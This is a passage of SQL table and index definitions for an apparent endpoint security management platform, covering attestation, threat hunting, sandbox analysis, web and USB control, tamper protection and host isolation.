      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_ftp_device ON forensic_triage_packages(device_id);
    CREATE INDEX IF NOT EXISTS idx_ftp_status ON forensic_triage_packages(status);

    -- 124. DEVICE_HEALTH_ATTESTATION_POLICIES — Zero-Trust Hardware Root-of-Trust & Measured Boot Standards
    CREATE TABLE IF NOT EXISTS device_health_attestation_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      require_secure_boot INTEGER NOT NULL DEFAULT 1 CHECK(require_secure_boot IN (0, 1)),
      require_bitlocker INTEGER NOT NULL DEFAULT 1 CHECK(require_bitlocker IN (0, 1)),
      require_virtualization_based_security INTEGER NOT NULL DEFAULT 1 CHECK(require_virtualization_based_security IN (0, 1)),
      require_hypervisor_enforced_code_integrity INTEGER NOT NULL DEFAULT 1 CHECK(require_hypervisor_enforced_code_integrity IN (0, 1)),
      require_elam_driver INTEGER NOT NULL DEFAULT 1 CHECK(require_elam_driver IN (0, 1)),
      allowed_pcr_hashes_json TEXT NOT NULL DEFAULT '{"pcr0":"","pcr2":"","pcr4":"","pcr11":""}',
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_dhap_enabled ON device_health_attestation_policies(is_enabled);

    -- 125. DEVICE_HEALTH_ATTESTATION_REPORTS — Endpoint TPM 2.0 PCR Measured Boot & Integrity Audits
    CREATE TABLE IF NOT EXISTS device_health_attestation_reports (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      attestation_status TEXT NOT NULL DEFAULT 'COMPLIANT' CHECK(attestation_status IN ('COMPLIANT', 'TAMPERED', 'OUT_OF_DATE', 'FAILED')),
      secure_boot_enabled INTEGER NOT NULL DEFAULT 1 CHECK(secure_boot_enabled IN (0, 1)),
      bitlocker_status TEXT NOT NULL DEFAULT 'PROTECTION_ON' CHECK(bitlocker_status IN ('PROTECTION_ON', 'PROTECTION_OFF', 'ENCRYPTING')),
      vbs_status TEXT NOT NULL DEFAULT 'RUNNING' CHECK(vbs_status IN ('RUNNING', 'NOT_ENABLED', 'NOT_SUPPORTED')),
      hvci_status TEXT NOT NULL DEFAULT 'STRICT_ENFORCEMENT' CHECK(hvci_status IN ('STRICT_ENFORCEMENT', 'AUDIT_MODE', 'DISABLED')),
      bootkit_detected INTEGER NOT NULL DEFAULT 0 CHECK(bootkit_detected IN (0, 1)),
      tpm_pcr_measurements_json TEXT NOT NULL DEFAULT '{}',
      tcg_event_log_summary TEXT,
      verified_at TEXT DEFAULT (DATETIME('now')),
      expires_at TEXT,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_dhar_device ON device_health_attestation_reports(device_id);
    CREATE INDEX IF NOT EXISTS idx_dhar_status ON device_health_attestation_reports(attestation_status);

    -- 126. MICROSEGMENTATION_NETWORK_POLICIES — Zero-Trust Software-Defined Perimeter & WFP Enforcement
    CREATE TABLE IF NOT EXISTS microsegmentation_network_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      source_group_id TEXT,
      destination_cidr TEXT NOT NULL DEFAULT '0.0.0.0/0',
      allowed_ports_json TEXT NOT NULL DEFAULT '["443"]',
      protocol TEXT NOT NULL DEFAULT 'TCP' CHECK(protocol IN ('TCP', 'UDP', 'ICMP', 'ANY')),
      action TEXT NOT NULL DEFAULT 'ALLOW' CHECK(action IN ('ALLOW', 'BLOCK', 'REQUIRE_DHA_COMPLIANCE')),
      enforcement_mode TEXT NOT NULL DEFAULT 'ENFORCING' CHECK(enforcement_mode IN ('AUDIT_ONLY', 'ENFORCING')),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_mnp_enabled ON microsegmentation_network_policies(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_mnp_action ON microsegmentation_network_policies(action);

    -- 127. THREAT_HUNT_CAMPAIGNS — Distributed Fleet Threat Hunting & IoC Sweeps
    CREATE TABLE IF NOT EXISTS threat_hunt_campaigns (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      hunt_type TEXT NOT NULL CHECK(hunt_type IN ('YARA_SCAN', 'SIGMA_RULE', 'FILE_HASH_SWEEP', 'MUTEX_NAMED_PIPE', 'REGISTRY_PERSISTENCE')),
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      pattern_definition TEXT NOT NULL,
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      mitre_technique TEXT DEFAULT 'T1059',
      action_on_match TEXT NOT NULL DEFAULT 'ALERT' CHECK(action_on_match IN ('ALERT', 'CONTAIN_HOST', 'KILL_PROCESS')),
      status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(status IN ('QUEUED', 'ACTIVE', 'COMPLETED', 'CANCELLED')),
      nodes_targeted INTEGER NOT NULL DEFAULT 0,
      nodes_completed INTEGER NOT NULL DEFAULT 0,
      matches_detected INTEGER NOT NULL DEFAULT 0,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_thc_status ON threat_hunt_campaigns(status);
    CREATE INDEX IF NOT EXISTS idx_thc_type ON threat_hunt_campaigns(hunt_type);

    -- 128. THREAT_HUNT_MATCHES — Endpoint IoC Detections & Evidence Ledger
    CREATE TABLE IF NOT EXISTS threat_hunt_matches (
      id TEXT PRIMARY KEY,
      hunt_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      match_type TEXT NOT NULL,
      matched_item TEXT NOT NULL,
      file_path TEXT,
      sha256_hash TEXT,
      evidence_snippet_json TEXT NOT NULL DEFAULT '{}',
      mitre_technique TEXT,
      action_taken TEXT DEFAULT 'ALERTED',
      detected_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(hunt_id) REFERENCES threat_hunt_campaigns(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_thm_hunt ON threat_hunt_matches(hunt_id);
    CREATE INDEX IF NOT EXISTS idx_thm_device ON threat_hunt_matches(device_id);

    -- 129. IOC_WATCHLIST_INDICATORS — Threat Intelligence Feeds & File Hash Watchlists
    CREATE TABLE IF NOT EXISTS ioc_watchlist_indicators (
      id TEXT PRIMARY KEY,
      indicator_type TEXT NOT NULL CHECK(indicator_type IN ('SHA256', 'MD5', 'DOMAIN', 'IP', 'MUTEX', 'FILE_PATH', 'REGISTRY_KEY')),
      indicator_value TEXT NOT NULL,
      threat_name TEXT NOT NULL,
      confidence TEXT NOT NULL DEFAULT 'HIGH' CHECK(confidence IN ('LOW', 'MEDIUM', 'HIGH')),
      action_on_match TEXT NOT NULL DEFAULT 'ALERT' CHECK(action_on_match IN ('ALERT', 'CONTAIN_HOST', 'KILL_PROCESS')),
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_iwi_val ON ioc_watchlist_indicators(indicator_value);
    CREATE INDEX IF NOT EXISTS idx_iwi_active ON ioc_watchlist_indicators(is_active);
    -- 130. SANDBOX_DETONATION_JOBS — Automated Malware Sandbox Detonation & Dynamic Analysis
    CREATE TABLE IF NOT EXISTS sandbox_detonation_jobs (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      sample_name TEXT NOT NULL,
      sample_type TEXT NOT NULL CHECK(sample_type IN ('EXECUTABLE', 'POWERSHELL_SCRIPT', 'BATCH_SCRIPT', 'OFFICE_MACRO', 'DYNAMIC_LINK_LIB', 'URL_PAYLOAD')),
      sample_sha256 TEXT NOT NULL,
      file_path TEXT,
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'DETONATING', 'COMPLETED', 'FAILED', 'TIMED_OUT', 'CANCELLED')),
      verdict TEXT NOT NULL DEFAULT 'PENDING' CHECK(verdict IN ('PENDING', 'BENIGN', 'SUSPICIOUS', 'MALICIOUS', 'UNKNOWN')),
      risk_score INTEGER NOT NULL DEFAULT 0 CHECK(risk_score >= 0 AND risk_score <= 100),
      sandbox_env TEXT NOT NULL DEFAULT 'WIN11_SANDBOX_SECURE' CHECK(sandbox_env IN ('WIN11_SANDBOX_SECURE', 'WIN10_LEGACY_ISOLATED', 'HVCI_RESTRICTED')),
      execution_duration_sec INTEGER NOT NULL DEFAULT 0,
      mitre_tactics_json TEXT NOT NULL DEFAULT '[]',
      automated_remediation TEXT NOT NULL DEFAULT 'NONE' CHECK(automated_remediation IN ('NONE', 'QUARANTINE_FILE', 'ISOLATE_ENDPOINT', 'KILL_PROCESS_TREE')),
      created_at TEXT DEFAULT (DATETIME('now')),
      completed_at TEXT,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_sdj_status ON sandbox_detonation_jobs(status);
    CREATE INDEX IF NOT EXISTS idx_sdj_verdict ON sandbox_detonation_jobs(verdict);
    CREATE INDEX IF NOT EXISTS idx_sdj_device ON sandbox_detonation_jobs(device_id);

    -- 131. PROCESS_LINEAGE_NODES — EDR Process Execution Lineage & Parent-Child Trees
    CREATE TABLE IF NOT EXISTS process_lineage_nodes (
      id TEXT PRIMARY KEY,
      detonation_id TEXT,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      process_id INTEGER NOT NULL,
      parent_process_id INTEGER NOT NULL,
      process_name TEXT NOT NULL,
      parent_process_name TEXT NOT NULL,
      command_line TEXT,
      executable_path TEXT NOT NULL,
      sha256_hash TEXT,
      integrity_level TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(integrity_level IN ('UNTRUSTED', 'LOW', 'MEDIUM', 'HIGH', 'SYSTEM')),
      user_sid TEXT NOT NULL DEFAULT 'S-1-5-18',
      spawned_at TEXT DEFAULT (DATETIME('now')),
      terminated_at TEXT,
      is_anomalous INTEGER NOT NULL DEFAULT 0 CHECK(is_anomalous IN (0, 1)),
      anomaly_reasons_json TEXT NOT NULL DEFAULT '[]',
      FOREIGN KEY(detonation_id) REFERENCES sandbox_detonation_jobs(id) ON DELETE SET NULL,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_pln_detonation ON process_lineage_nodes(detonation_id);
    CREATE INDEX IF NOT EXISTS idx_pln_device ON process_lineage_nodes(device_id);
    CREATE INDEX IF NOT EXISTS idx_pln_pid ON process_lineage_nodes(process_id);

    -- 132. BEHAVIORAL_TELEMETRY_EVENTS — Granular EDR Activity Logs (Injections, Drops, Beacons)
    CREATE TABLE IF NOT EXISTS behavioral_telemetry_events (
      id TEXT PRIMARY KEY,
      detonation_id TEXT,
      process_id INTEGER NOT NULL,
      process_name TEXT NOT NULL,
      event_category TEXT NOT NULL CHECK(event_category IN ('PROCESS_INJECTION', 'FILE_WRITE_DROP', 'REGISTRY_PERSISTENCE', 'C2_NETWORK_BEACON', 'CREDENTIAL_ACCESS', 'DEFENSE_EVASION')),
      event_action TEXT NOT NULL,
      target_object TEXT NOT NULL,
      details_json TEXT NOT NULL DEFAULT '{}',
      severity TEXT NOT NULL DEFAULT 'INFO' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      mitre_technique TEXT,
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(detonation_id) REFERENCES sandbox_detonation_jobs(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_bte_detonation ON behavioral_telemetry_events(detonation_id);
    CREATE INDEX IF NOT EXISTS idx_bte_category ON behavioral_telemetry_events(event_category);
    CREATE INDEX IF NOT EXISTS idx_bte_severity ON behavioral_telemetry_events(severity);
    -- 133. WEB_CONTENT_FILTERING_POLICIES — Microsoft Defender Web Protection & Filtering Baselines
    CREATE TABLE IF NOT EXISTS web_content_filtering_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      block_adult_content INTEGER NOT NULL DEFAULT 1 CHECK(block_adult_content IN (0, 1)),
      block_high_liability INTEGER NOT NULL DEFAULT 1 CHECK(block_high_liability IN (0, 1)),
      block_legal_liability INTEGER NOT NULL DEFAULT 1 CHECK(block_legal_liability IN (0, 1)),
      block_bandwidth_loss INTEGER NOT NULL DEFAULT 0 CHECK(block_bandwidth_loss IN (0, 1)),
      block_unrated INTEGER NOT NULL DEFAULT 0 CHECK(block_unrated IN (0, 1)),
      smartscreen_mode TEXT NOT NULL DEFAULT 'BLOCK' CHECK(smartscreen_mode IN ('DISABLED', 'WARN', 'BLOCK')),
      allow_user_bypass INTEGER NOT NULL DEFAULT 0 CHECK(allow_user_bypass IN (0, 1)),
      network_protection_mode TEXT NOT NULL DEFAULT 'BLOCK' CHECK(network_protection_mode IN ('DISABLED', 'AUDIT', 'BLOCK')),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_wcfp_enabled ON web_content_filtering_policies(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_wcfp_smartscreen ON web_content_filtering_policies(smartscreen_mode);

    -- 134. WEB_INDICATOR_RULES — Custom Domain, URL, FQDN & IP Indicator Overrides
    CREATE TABLE IF NOT EXISTS web_indicator_rules (
      id TEXT PRIMARY KEY,
      policy_id TEXT,
      indicator_type TEXT NOT NULL CHECK(indicator_type IN ('DOMAIN', 'URL', 'IP_ADDRESS', 'CIDR_SUBNET')),
      indicator_value TEXT NOT NULL,
      action TEXT NOT NULL DEFAULT 'BLOCK' CHECK(action IN ('ALLOW', 'WARN', 'BLOCK', 'REDIRECT_PORTAL')),
      category TEXT DEFAULT 'Custom Security Rule',
      redirect_url TEXT,
      expiration_date TEXT,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES web_content_filtering_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_wir_val ON web_indicator_rules(indicator_value);
    CREATE INDEX IF NOT EXISTS idx_wir_action ON web_indicator_rules(action);
    CREATE INDEX IF NOT EXISTS idx_wir_policy ON web_indicator_rules(policy_id);

    -- 135. WEB_PROTECTION_AUDIT_EVENTS — Network Threat Intercepts & SmartScreen Events
    CREATE TABLE IF NOT EXISTS web_protection_audit_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      username TEXT NOT NULL DEFAULT 'System',
      event_type TEXT NOT NULL CHECK(event_type IN ('URL_BLOCKED', 'PHISHING_ATTEMPT_DETECTED', 'MALWARE_DROP_BLOCKED', 'SMARTSCREEN_WARNING_BYPASS', 'DNS_SINKHOLE_TRIGGERED')),
      url TEXT NOT NULL,
      domain TEXT NOT NULL,
      ip_address TEXT,
      category TEXT NOT NULL,
      action_taken TEXT NOT NULL DEFAULT 'BLOCKED' CHECK(action_taken IN ('BLOCKED', 'WARNED', 'ALLOWED_BY_RULE', 'USER_BYPASSED')),
      browser_process TEXT NOT NULL DEFAULT 'msedge.exe',
      severity TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_wpae_device ON web_protection_audit_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_wpae_type ON web_protection_audit_events(event_type);
    CREATE INDEX IF NOT EXISTS idx_wpae_time ON web_protection_audit_events(timestamp DESC);
    -- 136. USB_DEVICE_CONTROL_POLICIES — Removable Storage & Peripheral Device Control Baselines
    CREATE TABLE IF NOT EXISTS usb_device_control_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      removable_storage_access TEXT NOT NULL DEFAULT 'READ_ONLY' CHECK(removable_storage_access IN ('ALLOW', 'READ_ONLY', 'BLOCK')),
      bluetooth_mode TEXT NOT NULL DEFAULT 'RESTRICTED' CHECK(bluetooth_mode IN ('ALLOWED', 'RESTRICTED', 'DISABLED')),
      printer_protection_mode TEXT NOT NULL DEFAULT 'AUDIT' CHECK(printer_protection_mode IN ('ALLOW', 'AUDIT', 'BLOCK')),
      audit_level TEXT NOT NULL DEFAULT 'DETAILED' CHECK(audit_level IN ('MINIMAL', 'STANDARD', 'DETAILED')),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_udcp_enabled ON usb_device_control_policies(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_udcp_storage ON usb_device_control_policies(removable_storage_access);

    -- 137. USB_DEVICE_EXCEPTIONS — Hardware Whitelist & Vendor/Product/Serial Exceptions
    CREATE TABLE IF NOT EXISTS usb_device_exceptions (
      id TEXT PRIMARY KEY,
      policy_id TEXT,
      friendly_name TEXT NOT NULL,
      vendor_id TEXT,
      product_id TEXT,
      serial_number TEXT,
      device_interface_id TEXT,
      action TEXT NOT NULL DEFAULT 'ALLOW' CHECK(action IN ('ALLOW', 'AUDIT_ONLY', 'BLOCK')),
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES usb_device_control_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_ude_vid_pid ON usb_device_exceptions(vendor_id, product_id);
    CREATE INDEX IF NOT EXISTS idx_ude_serial ON usb_device_exceptions(serial_number);
    CREATE INDEX IF NOT EXISTS idx_ude_policy ON usb_device_exceptions(policy_id);

    -- 138. PERIPHERAL_AUDIT_EVENTS — Forensic USB/Peripheral Connect & Write Interception Stream
    CREATE TABLE IF NOT EXISTS peripheral_audit_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      username TEXT NOT NULL DEFAULT 'System',
      event_type TEXT NOT NULL CHECK(event_type IN ('USB_ATTACH', 'USB_DETACH', 'WRITE_BLOCKED', 'READ_ONLY_ENFORCED', 'BLUETOOTH_RESTRICTED', 'PRINT_AUDITED')),
      device_name TEXT NOT NULL,
      hardware_id TEXT,
      serial_number TEXT,
      action_taken TEXT NOT NULL DEFAULT 'BLOCKED' CHECK(action_taken IN ('ALLOWED', 'BLOCKED', 'AUDITED')),
      process_name TEXT NOT NULL DEFAULT 'explorer.exe',
      file_path TEXT,
      details TEXT,
      severity TEXT NOT NULL DEFAULT 'MEDIUM' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_pae_device ON peripheral_audit_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_pae_type ON peripheral_audit_events(event_type);
    CREATE INDEX IF NOT EXISTS idx_pae_action ON peripheral_audit_events(action_taken);
    CREATE INDEX IF NOT EXISTS idx_pae_time ON peripheral_audit_events(timestamp DESC);
    -- 139. TAMPER_PROTECTION_POLICIES — Defender Core Tamper & Anti-Snooping Baselines (Iteration 50)
    CREATE TABLE IF NOT EXISTS tamper_protection_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      tamper_protection_state TEXT NOT NULL DEFAULT 'ENFORCED' CHECK(tamper_protection_state IN ('ENFORCED', 'AUDIT_ONLY', 'DISABLED')),
      lock_security_services INTEGER NOT NULL DEFAULT 1 CHECK(lock_security_services IN (0, 1)),
      protect_antivirus_exclusions INTEGER NOT NULL DEFAULT 1 CHECK(protect_antivirus_exclusions IN (0, 1)),
      prevent_safe_mode_bypass INTEGER NOT NULL DEFAULT 1 CHECK(prevent_safe_mode_bypass IN (0, 1)),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_tpp_enabled ON tamper_protection_policies(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_tpp_state ON tamper_protection_policies(tamper_protection_state);

    -- 140. ANTIVIRUS_EXCLUSION_RULES — Governed File, Folder, Extension & Process AV Exclusions (Iteration 50)
    CREATE TABLE IF NOT EXISTS antivirus_exclusion_rules (
      id TEXT PRIMARY KEY,
      policy_id TEXT,
      exclusion_type TEXT NOT NULL CHECK(exclusion_type IN ('PATH', 'FOLDER', 'EXTENSION', 'PROCESS')),
      exclusion_value TEXT NOT NULL,
      risk_tier TEXT NOT NULL DEFAULT 'LOW' CHECK(risk_tier IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      justification TEXT NOT NULL,
      approved_by TEXT NOT NULL DEFAULT 'SecurityAdmin',
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES tamper_protection_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_aver_val ON antivirus_exclusion_rules(exclusion_value);
    CREATE INDEX IF NOT EXISTS idx_aver_type ON antivirus_exclusion_rules(exclusion_type);
    CREATE INDEX IF NOT EXISTS idx_aver_policy ON antivirus_exclusion_rules(policy_id);

    -- 141. TAMPER_AUDIT_EVENTS — Real-time Registry, Service & Exclusion Tampering Stream (Iteration 50)
    CREATE TABLE IF NOT EXISTS tamper_audit_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      username TEXT NOT NULL DEFAULT 'System',
      event_type TEXT NOT NULL CHECK(event_type IN ('REGISTRY_TAMPER_ATTEMPT', 'SERVICE_STOP_ATTEMPT', 'UNAUTHORIZED_EXCLUSION_INJECTED', 'DRIVER_UNLOAD_ATTEMPT', 'RTP_DISABLE_ATTEMPT')),
      target_resource TEXT NOT NULL,
      attacker_process TEXT NOT NULL,
      action_taken TEXT NOT NULL DEFAULT 'BLOCKED' CHECK(action_taken IN ('BLOCKED', 'RESTORED', 'AUDITED')),
      details TEXT,
      severity TEXT NOT NULL DEFAULT 'CRITICAL' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_tae_device ON tamper_audit_events(device_id);
    CREATE INDEX IF NOT EXISTS idx_tae_type ON tamper_audit_events(event_type);
    CREATE INDEX IF NOT EXISTS idx_tae_time ON tamper_audit_events(timestamp DESC);
    -- 142. NETWORK_ISOLATION_POLICIES — Live Host Quarantine & WFP Isolation Baselines (Iteration 51)
    CREATE TABLE IF NOT EXISTS network_isolation_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      isolation_mode TEXT NOT NULL DEFAULT 'SELECTIVE_MANAGEMENT' CHECK(isolation_mode IN ('FULL_DISCONNECT', 'SELECTIVE_MANAGEMENT', 'HONEYPOT_REDIRECT')),
      allow_dns INTEGER NOT NULL DEFAULT 1 CHECK(allow_dns IN (0, 1)),
      allow_dhcp INTEGER NOT NULL DEFAULT 1 CHECK(allow_dhcp IN (0, 1)),
      allow_fleet_telemetry INTEGER NOT NULL DEFAULT 1 CHECK(allow_fleet_telemetry IN (0, 1)),
      honeypot_redirect_ip TEXT,
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_nip_enabled ON network_isolation_policies(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_nip_mode ON network_isolation_policies(isolation_mode);

    -- 143. ISOLATION_EXCLUSION_ENDPOINTS — Out-of-band SecOps & Cloudflare Tunnels Ingress (Iteration 51)
    CREATE TABLE IF NOT EXISTS isolation_exclusion_endpoints (
      id TEXT PRIMARY KEY,
      policy_id TEXT,
      friendly_name TEXT NOT NULL,
      endpoint_type TEXT NOT NULL CHECK(endpoint_type IN ('IP_ADDRESS', 'CIDR_SUBNET', 'FQDN', 'PORT_RANGE')),
      endpoint_value TEXT NOT NULL,
      direction TEXT NOT NULL DEFAULT 'OUTBOUND' CHECK(direction IN ('INBOUND', 'OUTBOUND', 'BOTH')),
      port INTEGER,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES network_isolation_policies(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_iee_val ON isolation_exclusion_endpoints(endpoint_value);
    CREATE INDEX IF NOT EXISTS idx_iee_policy ON isolation_exclusion_endpoints(policy_id);

    -- 144. ISOLATION_AUDIT_LOGS — Forensic Host Containment Transitions & Packet Drops (Iteration 51)
    CREATE TABLE IF NOT EXISTS isolation_audit_logs (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      transition_type TEXT NOT NULL CHECK(transition_type IN ('HOST_ISOLATED', 'HOST_RELEASED', 'EXCLUSION_BYPASS_ATTEMPT', 'UNAUTHORIZED_TRAFFIC_DROPPED')),
      initiated_by TEXT NOT NULL DEFAULT 'SecOps Admin',
      reason TEXT NOT NULL,
      packet_summary TEXT,
      details TEXT,
      severity TEXT NOT NULL DEFAULT 'HIGH' CHECK(severity IN ('INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      timestamp TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_ial_device ON isolation_audit_logs(device_id);
    CREATE INDEX IF NOT EXISTS idx_ial_type ON isolation_audit_logs(transition_type);
    CREATE INDEX IF NOT EXISTS idx_ial_time ON isolation_audit_logs(timestamp DESC);
  
    -- 145. CUSTOM_REMEDIATION_PACKAGES — Automated Detection & Script Remediation Playbooks (Iteration 52)
    CREATE TABLE IF NOT EXISTS custom_remediation_packages (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      category TEXT NOT NULL DEFAULT 'SYSTEM_HEALTH' CHECK(category IN ('SECURITY_HARDENING', 'SYSTEM_HEALTH', 'MALWARE_REMEDIATION', 'CONFIG_DRIFT', 'SOFTWARE_REMOVAL', 'CUSTOM')),
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'DEVICE', 'ORGANIZATION')),
      target_id TEXT,
      detection_script TEXT NOT NULL,
      remediation_script TEXT NOT NULL,
      script_type TEXT NOT NULL DEFAULT 'POWERSHELL' CHECK(script_type IN ('POWERSHELL', 'BASH', 'PYTHON', 'CMD')),
      execution_timeout INTEGER NOT NULL DEFAULT 300,
      run_frequency TEXT NOT NULL DEFAULT 'DAILY' CHECK(run_frequency IN ('ON_DEMAND', 'HOURLY', 'DAILY', 'WEEKLY', 'MONTHLY')),
      run_as_account TEXT NOT NULL DEFAULT 'SYSTEM' CHECK(run_as_account IN ('SYSTEM', 'CURRENT_USER', 'LOCAL_SERVICE')),
      enforce_signature_check INTEGER NOT NULL DEFAULT 0 CHECK(enforce_signature_check IN (0, 1)),
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
